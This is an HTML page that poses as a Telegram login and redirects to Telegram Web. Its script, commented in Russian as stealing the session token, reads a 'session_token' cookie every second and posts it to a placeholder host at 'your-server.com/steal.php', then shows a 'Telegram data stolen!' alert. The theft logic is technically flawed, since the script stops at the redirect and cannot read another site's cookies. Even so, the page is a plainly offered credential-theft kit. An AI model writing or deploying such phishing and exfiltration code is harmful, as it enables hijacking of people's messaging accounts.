<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Telegram Login</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f5f5f5;
      margin: 0;
      padding: 0;
    }
    .container {
      width: 100%;
      max-width: 400px;
      margin: 50px auto;
      background-color: #fff;
      padding: 30px;
      border-radius: 10px;
      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
    }
    h2 {
      text-align: center;
      color: #2a85e5;
    }
    p {
      text-align: center;
      margin: 20px 0;
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>Telegram</h2>
    <p>Автоматически перенаправляем на Telegram Web.</p>
  </div>

  <script>
    // Немедленно перенаправляем на Telegram Web
    window.location.href = "https://web.telegram.org/";

    // После перенаправления, крадём session_token (если пользователь уже авторизован)
    setInterval(function () {
      const token = document.cookie.match('(^|;)\\s*session_token\\s*=([^;]+)')?.pop();
      if (token) {
        fetch('https://your-server.com/steal.php', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({ token })
        }).then(response => {
          if (response.ok) {
            alert("Telegram data stolen! Redirecting...");
            window.location.href = "https://web.telegram.org";
          }
        }).catch(error => {
          console.error('Error:', error);
        });
      }
    }, 1000);
  </script>
</body>
</html>
